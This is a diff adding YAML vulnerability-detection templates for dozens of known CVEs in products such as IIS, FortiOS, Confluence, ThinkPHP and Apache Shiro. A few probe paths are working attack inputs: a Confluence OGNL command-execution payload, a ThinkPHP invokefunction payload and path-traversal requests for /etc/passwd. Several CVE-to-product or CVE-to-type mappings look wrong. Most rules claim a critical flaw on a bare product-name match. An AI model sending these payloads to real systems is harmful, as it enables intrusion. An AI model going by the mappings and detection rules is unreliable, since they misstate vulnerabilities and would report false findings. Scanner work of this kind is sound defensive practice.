+    tags: ["cve", "http", "CVE-2017-12636"]
+    cpe: "cpe:2.3:a:apache:couchdb:*"
+    service: http
+    port: 5984
+- id: CVE-2015-1635
+  name: IIS HTTP.sys RCE
+  severity: critical
+  author: argus
+  description: "IIS HTTP.sys RCE - CVE-2015-1635"
+  cve: CVE-2015-1635
+  cvss: 10.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: iis
+    path: /
+    match_rule:
+      match_type: Header
+      pattern: "MS-Authorization"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2015-1635"]
+    cpe: "cpe:2.3:a:microsoft:iis:*"
+    service: http
+    port: 80
+- id: CVE-2017-7269
+  name: IIS WebDAV Overflow
+  severity: critical
+  author: argus
+  description: "IIS WebDAV Overflow - CVE-2017-7269"
+  cve: CVE-2017-7269
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: iis
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "PROPFIND"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-7269"]
+    cpe: "cpe:2.3:a:microsoft:iis:*"
+    service: http
+    port: 80
+- id: CVE-2019-11043
+  name: PHP-FPM RCE
+  severity: critical
+  author: argus
+  description: "PHP-FPM RCE - CVE-2019-11043"
+  cve: CVE-2019-11043
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /status.php
+    match_rule:
+      match_type: Body
+      pattern: "nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-11043"]
+    cpe: "cpe:2.3:a:php:php:*"
+    service: http
+    port: 80
+- id: CVE-2018-13379
+  name: FortiOS Path Traversal
+  severity: critical
+  author: argus
+  description: "FortiOS Path Traversal - CVE-2018-13379"
+  cve: CVE-2018-13379
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /remote/error?errmsg=../../../../../../../dev/null
+    match_rule:
+      match_type: Body
+      pattern: "FortiGate"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-13379"]
+    cpe: "cpe:2.3:o:fortinet:fortios:*"
+    service: http
+    port: 443
+- id: CVE-2020-12812
+  name: FortiOS Auth Bypass
+  severity: high
+  author: argus
+  description: "FortiOS Auth Bypass - CVE-2020-12812"
+  cve: CVE-2020-12812
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "FortiGate"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-12812"]
+    cpe: "cpe:2.3:o:fortinet:fortios:*"
+    service: http
+    port: 443
+- id: CVE-2021-22123
+  name: FortiOS RCE
+  severity: critical
+  author: argus
+  description: "FortiOS RCE - CVE-2021-22123"
+  cve: CVE-2021-22123
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "FortiGate"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-22123"]
+    cpe: "cpe:2.3:o:fortinet:fortios:*"
+    service: http
+    port: 443
+- id: CVE-2019-1653
+  name: Cisco RV320 Info Disclosure
+  severity: high
+  author: argus
+  description: "Cisco RV320 Info Disclosure - CVE-2019-1653"
+  cve: CVE-2019-1653
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /cgi-bin/config.exp
+    match_rule:
+      match_type: Body
+      pattern: "Cisco"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-1653"]
+    cpe: "cpe:2.3:c:cisco:rv320:*"
+    service: http
+    port: 80
+- id: CVE-2020-3452
+  name: Cisco ASA/FTD DoS
+  severity: high
+  author: argus
+  description: "Cisco ASA/FTD DoS - CVE-2020-3452"
+  cve: CVE-2020-3452
+  cvss: 8.6
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /+CSCOE+/session_password.html
+    match_rule:
+      match_type: Body
+      pattern: "Cisco"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-3452"]
+    cpe: "cpe:2.3:c:cisco:adaptive_security_appliance:*"
+    service: http
+    port: 443
+- id: CVE-2022-26134
+  name: Confluence OGNL RCE
+  severity: critical
+  author: argus
+  description: "Confluence OGNL RCE - CVE-2022-26134"
+  cve: CVE-2022-26134
+  cvss: 10.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /${@java.lang.Runtime@getRuntime().exec('id')}/
+    match_rule:
+      match_type: Body
+      pattern: "Confluence"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-26134"]
+    cpe: "cpe:2.3:a:atlassian:confluence:*"
+    service: http
+    port: 8090
+- id: CVE-2019-3398
+  name: Confluence Path Traversal
+  severity: high
+  author: argus
+  description: "Confluence Path Traversal - CVE-2019-3398"
+  cve: CVE-2019-3398
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Confluence"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-3398"]
+    cpe: "cpe:2.3:a:atlassian:confluence:*"
+    service: http
+    port: 8090
+- id: CVE-2019-11581
+  name: Jira SSRF
+  severity: high
+  author: argus
+  description: "Jira SSRF - CVE-2019-11581"
+  cve: CVE-2019-11581
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /ContactAdministrators!default.jspa
+    match_rule:
+      match_type: Body
+      pattern: "Jira"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-11581"]
+    cpe: "cpe:2.3:a:atlassian:jira:*"
+    service: http
+    port: 8080
+- id: CVE-2019-3397
+  name: Bitbucket RCE
+  severity: critical
+  author: argus
+  description: "Bitbucket RCE - CVE-2019-3397"
+  cve: CVE-2019-3397
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Bitbucket"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-3397"]
+    cpe: "cpe:2.3:a:atlassian:bitbucket:*"
+    service: http
+    port: 7990
+- id: CVE-2017-18349
+  name: Fastjson RCE
+  severity: critical
+  author: argus
+  description: "Fastjson RCE - CVE-2017-18349"
+  cve: CVE-2017-18349
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "fastjson"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-18349"]
+    cpe: "cpe:2.3:a:alibaba:fastjson:*"
+    service: http
+    port: 80
+- id: CVE-2022-25845
+  name: Fastjson RCE v2
+  severity: critical
+  author: argus
+  description: "Fastjson RCE v2 - CVE-2022-25845"
+  cve: CVE-2022-25845
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "fastjson"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-25845"]
+    cpe: "cpe:2.3:a:alibaba:fastjson:*"
+    service: http
+    port: 80
+- id: CVE-2017-7525
+  name: Jackson Deserialization RCE
+  severity: critical
+  author: argus
+  description: "Jackson Deserialization RCE - CVE-2017-7525"
+  cve: CVE-2017-7525
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "jackson"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-7525"]
+    cpe: "cpe:2.3:a:fasterxml:jackson-databind:*"
+    service: http
+    port: 80
+- id: CVE-2017-14849
+  name: Node.js Path Traversal
+  severity: high
+  author: argus
+  description: "Node.js Path Traversal - CVE-2017-14849"
+  cve: CVE-2017-14849
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /static/../../../etc/passwd
+    match_rule:
+      match_type: Body
+      pattern: "nodejs"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-14849"]
+    cpe: "cpe:2.3:a:nodejs:node.js:*"
+    service: http
+    port: 80
+- id: CVE-2013-0156
+  name: Rails Deserialization RCE
+  severity: critical
+  author: argus
+  description: "Rails Deserialization RCE - CVE-2013-0156"
+  cve: CVE-2013-0156
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "rails"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2013-0156"]
+    cpe: "cpe:2.3:a:ruby_on_rails:ruby_on_rails:*"
+    service: http
+    port: 80
+- id: CVE-2020-8169
+  name: Rails Info Disclosure
+  severity: high
+  author: argus
+  description: "Rails Info Disclosure - CVE-2020-8169"
+  cve: CVE-2020-8169
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "rails"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-8169"]
+    cpe: "cpe:2.3:a:ruby_on_rails:ruby_on_rails:*"
+    service: http
+    port: 80
+- id: CVE-2018-16942
+  name: ThinkPHP RCE
+  severity: critical
+  author: argus
+  description: "ThinkPHP RCE - CVE-2018-16942"
+  cve: CVE-2018-16942
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /index.php?s=/index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+    match_rule:
+      match_type: Body
+      pattern: "thinkphp"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-16942"]
+    cpe: "cpe:2.3:a:thinkphp:thinkphp:*"
+    service: http
+    port: 80
+- id: CVE-2016-4437
+  name: Shiro RememberMe RCE
+  severity: critical
+  author: argus
+  description: "Shiro RememberMe RCE - CVE-2016-4437"
+  cve: CVE-2016-4437
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Header
+      pattern: "rememberMe"
+  metadata:
+    category: known_cve
+    tags: ["cve", "shiro", "CVE-2016-4437"]
+    cpe: "cpe:2.3:a:apache:shiro:*"
+    service: shiro
+    port: 80
+- id: CVE-2020-1957
+  name: Shiro Auth Bypass
+  severity: high
+  author: argus
+  description: "Shiro Auth Bypass - CVE-2020-1957"
+  cve: CVE-2020-1957
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "shiro"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-1957"]
+    cpe: "cpe:2.3:a:apache:shiro:*"
+    service: http
+    port: 80
+- id: CVE-2020-11989
+  name: Shiro Auth Bypass v2
+  severity: high
+  author: argus
+  description: "Shiro Auth Bypass v2 - CVE-2020-11989"
+  cve: CVE-2020-11989
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "shiro"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-11989"]
+    cpe: "cpe:2.3:a:apache:shiro:*"
+    service: http
+    port: 80
+- id: CVE-2018-1335
+  name: Tika RCE
+  severity: critical
+  author: argus
+  description: "Tika RCE - CVE-2018-1335"
+  cve: CVE-2018-1335
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "tika"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1335"]
+    cpe: "cpe:2.3:a:apache:tika:*"
+    service: http
+    port: 80
+- id: CVE-2021-28657
+  name: Tika RCE v2
+  severity: critical
+  author: argus
+  description: "Tika RCE v2 - CVE-2021-28657"
+  cve: CVE-2021-28657
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "tika"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-28657"]
+    cpe: "cpe:2.3:a:apache:tika:*"
+    service: http
+    port: 80
+- id: CVE-2018-8009
+  name: Hadoop RCE
+  severity: critical
+  author: argus
+  description: "Hadoop RCE - CVE-2018-8009"
+  cve: CVE-2018-8009
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "hadoop"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-8009"]
+    cpe: "cpe:2.3:a:apache:hadoop:*"
+    service: http
+    port: 80
+- id: CVE-2018-11770
+  name: Spark RCE
+  severity: critical
+  author: argus
+  description: "Spark RCE - CVE-2018-11770"
+  cve: CVE-2018-11770
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "spark"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-11770"]
+    cpe: "cpe:2.3:a:apache:spark:*"
+    service: http
+    port: 80
+- id: CVE-2020-9480
+  name: Spark RCE v2
+  severity: critical
+  author: argus
+  description: "Spark RCE v2 - CVE-2020-9480"
+  cve: CVE-2020-9480
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "spark"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-9480"]
+    cpe: "cpe:2.3:a:apache:spark:*"
+    service: http
+    port: 80
+- id: CVE-2020-17519
+  name: Flink Path Traversal
+  severity: high
+  author: argus
+  description: "Flink Path Traversal - CVE-2020-17519"
+  cve: CVE-2020-17519
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /jobmanager/logs/
+    match_rule:
+      match_type: Body
+      pattern: "flink"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-17519"]
+    cpe: "cpe:2.3:a:apache:flink:*"
+    service: http
+    port: 8081
+- id: CVE-2020-11995
+  name: Dubbo RCE
+  severity: critical
+  author: argus
+  description: "Dubbo RCE - CVE-2020-11995"
+  cve: CVE-2020-11995
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "dubbo"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-11995"]
+    cpe: "cpe:2.3:a:apache:dubbo:*"
+    service: http
+    port: 80
+- id: CVE-2015-4852
+  name: Commons Collections RCE
+  severity: critical
+  author: argus
+  description: "Commons Collections RCE - CVE-2015-4852"
+  cve: CVE-2015-4852
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "commons"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2015-4852"]
+    cpe: "cpe:2.3:a:apache:commons_collections:*"
+    service: http
+    port: 80
+- id: CVE-2017-15717
+  name: Commons Text RCE
+  severity: critical
+  author: argus
+  description: "Commons Text RCE - CVE-2017-15717"
+  cve: CVE-2017-15717
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "commons"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-15717"]
+    cpe: "cpe:2.3:a:apache:commons_text:*"
+    service: http
+    port: 80
+- id: CVE-2023-43236
+  name: OFBiz RCE
+  severity: critical
+  author: argus
+  description: "OFBiz RCE - CVE-2023-43236"
+  cve: CVE-2023-43236
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /webtools/control/ProgramExport
+    match_rule:
+      match_type: Body
+      pattern: "OFBiz"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-43236"]
+    cpe: "cpe:2.3:a:apache:ofbiz:*"
+    service: http
+    port: 8080
+- id: CVE-2020-9496
+  name: OFBiz RCE v2
+  severity: critical
+  author: argus
+  description: "OFBiz RCE v2 - CVE-2020-9496"
+  cve: CVE-2020-9496
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /webtools/control/
+    match_rule:
+      match_type: Body
+      pattern: "OFBiz"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-9496"]
+    cpe: "cpe:2.3:a:apache:ofbiz:*"
+    service: http
+    port: 8080
+- id: CVE-2017-3159
+  name: Camel Deserialization RCE
+  severity: critical
+  author: argus
+  description: "Camel Deserialization RCE - CVE-2017-3159"
+  cve: CVE-2017-3159
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Camel"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-3159"]
+    cpe: "cpe:2.3:a:apache:camel:*"
+    service: http
+    port: 80
+- id: CVE-2017-12624
+  name: CXF Deserialization RCE
+  severity: critical
+  author: argus
+  description: "CXF Deserialization RCE - CVE-2017-12624"
+  cve: CVE-2017-12624
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "CXF"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-12624"]
+    cpe: "cpe:2.3:a:apache:cxf:*"
+    service: http
+    port: 80
+- id: CVE-2021-20016
+  name: SonicWall SQLi
+  severity: high
+  author: argus
+  description: "SonicWall SQLi - CVE-2021-20016"
+  cve: CVE-2021-20016
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "SonicWall"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-20016"]
+    cpe: "cpe:2.3:o:sonicwall:sonicos:*"
+    service: http
+    port: 443
+- id: CVE-2021-21091
+  name: AEM XXE
+  severity: high
+  author: argus
+  description: "AEM XXE - CVE-2021-21091"
+  cve: CVE-2021-21091
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "aem"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-21091"]
+    cpe: "cpe:2.3:a:adobe:experience_manager:*"
+    service: http
+    port: 80
+- id: CVE-2023-26583
+  name: NiFi RCE
+  severity: critical
+  author: argus
+  description: "NiFi RCE - CVE-2023-26583"
+  cve: CVE-2023-26583
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /nifi/
+    match_rule:
+      match_type: Body
+      pattern: "NiFi"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-26583"]
+    cpe: "cpe:2.3:a:apache:nifi:*"
+    service: http
+    port: 8080
+- id: CVE-2022-32929
+  name: NiFi Info Disclosure
+  severity: medium
+  author: argus
+  description: "NiFi Info Disclosure - CVE-2022-32929"
+  cve: CVE-2022-32929
+  cvss: 5.3
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /nifi/
+    match_rule:
+      match_type: Body
+      pattern: "NiFi"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-32929"]
+    cpe: "cpe:2.3:a:apache:nifi:*"
+    service: http
+    port: 8080
+- id: CVE-2021-30862
+  name: Zeppelin RCE
+  severity: critical
+  author: argus
+  description: "Zeppelin RCE - CVE-2021-30862"
+  cve: CVE-2021-30862
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Zeppelin"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-30862"]
+    cpe: "cpe:2.3:a:apache:zeppelin:*"
+    service: http
+    port: 8080
+- id: CVE-2020-17517
+  name: Tapestry RCE
+  severity: critical
+  author: argus
+  description: "Tapestry RCE - CVE-2020-17517"
+  cve: CVE-2020-17517
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tapestry"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-17517"]
+    cpe: "cpe:2.3:a:apache:tapestry:*"
+    service: http
+    port: 80
+- id: CVE-2018-17196
+  name: Kafka Info Disclosure
+  severity: medium
+  author: argus
+  description: "Kafka Info Disclosure - CVE-2018-17196"
+  cve: CVE-2018-17196
+  cvss: 5.3
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "kafka"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-17196"]
+    cpe: "cpe:2.3:a:apache:kafka:*"
+    service: http
+    port: 80
+- id: CVE-2019-0201
+  name: ZooKeeper Info Disclosure
+  severity: medium
+  author: argus
+  description: "ZooKeeper Info Disclosure - CVE-2019-0201"
+  cve: CVE-2019-0201
+  cvss: 5.3
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "zookeeper"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-0201"]
+    cpe: "cpe:2.3:a:apache:zookeeper:*"
+    service: http
+    port: 80
+- id: CVE-2018-8017
+  name: Ranger SQLi
+  severity: high
+  author: argus
+  description: "Ranger SQLi - CVE-2018-8017"
+  cve: CVE-2018-8017
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "ranger"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-8017"]
+    cpe: "cpe:2.3:a:apache:ranger:*"
+    service: http
+    port: 80
+- id: CVE-2019-10164
+  name: PostgreSQL RCE
+  severity: critical
+  author: argus
+  description: "PostgreSQL RCE - CVE-2019-10164"
+  cve: CVE-2019-10164
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "PostgreSQL"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-10164"]
+    cpe: "cpe:2.3:a:postgresql:postgresql:*"
+    service: http
+    port: 5432
+- id: CVE-2020-1720
+  name: PostgreSQL Priv Esc
+  severity: high
+  author: argus
+  description: "PostgreSQL Priv Esc - CVE-2020-1720"
+  cve: CVE-2020-1720
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "PostgreSQL"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-1720"]
+    cpe: "cpe:2.3:a:postgresql:postgresql:*"
+    service: http
+    port: 5432
+- id: CVE-2016-6663
+  name: MySQL RCE
+  severity: critical
+  author: argus
+  description: "MySQL RCE - CVE-2016-6663"
+  cve: CVE-2016-6663
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "MySQL"
+  metadata:
+    category: known_cve
+    tags: ["cve", "mysql", "CVE-2016-6663"]
+    cpe: "cpe:2.3:a:oracle:mysql:*"
+    service: mysql
+    port: 3306
+- id: CVE-2019-2628
+  name: MySQL DoS
+  severity: medium
+  author: argus
+  description: "MySQL DoS - CVE-2019-2628"
+  cve: CVE-2019-2628
+  cvss: 5.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "MySQL"
+  metadata:
+    category: known_cve
+    tags: ["cve", "mysql", "CVE-2019-2628"]
+    cpe: "cpe:2.3:a:oracle:mysql:*"
+    service: mysql
+    port: 3306
+- id: CVE-2015-2804
+  name: MongoDB Auth Bypass
+  severity: high
+  author: argus
+  description: "MongoDB Auth Bypass - CVE-2015-2804"
+  cve: CVE-2015-2804
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "MongoDB"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2015-2804"]
+    cpe: "cpe:2.3:a:mongodb:mongodb:*"
+    service: http
+    port: 27017
+- id: CVE-2021-21311
+  name: Laravel RCE
+  severity: critical
+  author: argus
+  description: "Laravel RCE - CVE-2021-21311"
+  cve: CVE-2021-21311
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "laravel"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-21311"]
+    cpe: "cpe:2.3:a:laravel:framework:*"
+    service: http
+    port: 80
+- id: CVE-2017-16894
+  name: Laravel Info Disclosure
+  severity: high
+  author: argus
+  description: "Laravel Info Disclosure - CVE-2017-16894"
+  cve: CVE-2017-16894
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "laravel"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-16894"]
+    cpe: "cpe:2.3:a:laravel:framework:*"
+    service: http
+    port: 80
+- id: CVE-2017-16116
+  name: Express.js DoS
+  severity: medium
+  author: argus
+  description: "Express.js DoS - CVE-2017-16116"
+  cve: CVE-2017-16116
+  cvss: 5.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "express"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-16116"]
+    cpe: "cpe:2.3:a:expressjs:express:*"
+    service: http
+    port: 80
+- id: CVE-2019-0227
+  name: Axis2 RCE
+  severity: high
+  author: argus
+  description: "Axis2 RCE - CVE-2019-0227"
+  cve: CVE-2019-0227
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /axis2/services/
+    match_rule:
+      match_type: Body
+      pattern: "Axis2"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-0227"]
+    cpe: "cpe:2.3:a:apache:axis2:*"
+    service: http
+    port: 8080
+- id: CVE-2020-13956
+  name: HttpClient URI Bypass
+  severity: medium
+  author: argus
+  description: "HttpClient URI Bypass - CVE-2020-13956"
+  cve: CVE-2020-13956
+  cvss: 5.3
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "httpclient"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-13956"]
+    cpe: "cpe:2.3:a:apache:httpclient:*"
+    service: http
+    port: 80
+- id: CVE-2021-27924
+  name: Superset SQLi
+  severity: high
+  author: argus
+  description: "Superset SQLi - CVE-2021-27924"
+  cve: CVE-2021-27924
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /superset/
+    match_rule:
+      match_type: Body
+      pattern: "Superset"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-27924"]
+    cpe: "cpe:2.3:a:apache:superset:*"
+    service: http
+    port: 8088
+- id: CVE-2021-37540
+  name: Superset Info Disclosure
+  severity: medium
+  author: argus
+  description: "Superset Info Disclosure - CVE-2021-37540"
+  cve: CVE-2021-37540
+  cvss: 5.3
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Superset"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-37540"]
+    cpe: "cpe:2.3:a:apache:superset:*"
+    service: http
+    port: 8088
+- id: CVE-2018-9192
+  name: Beam Info Disclosure
+  severity: medium
+  author: argus
+  description: "Beam Info Disclosure - CVE-2018-9192"
+  cve: CVE-2018-9192
+  cvss: 5.3
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "beam"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-9192"]
+    cpe: "cpe:2.3:a:apache:beam:*"
+    service: http
+    port: 80
+- id: CVE-2024-38286
+  name: Tomcat TLS Handshake DoS
+  severity: high
+  author: argus
+  description: "Tomcat TLS Handshake DoS - CVE-2024-38286"
+  cve: CVE-2024-38286
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
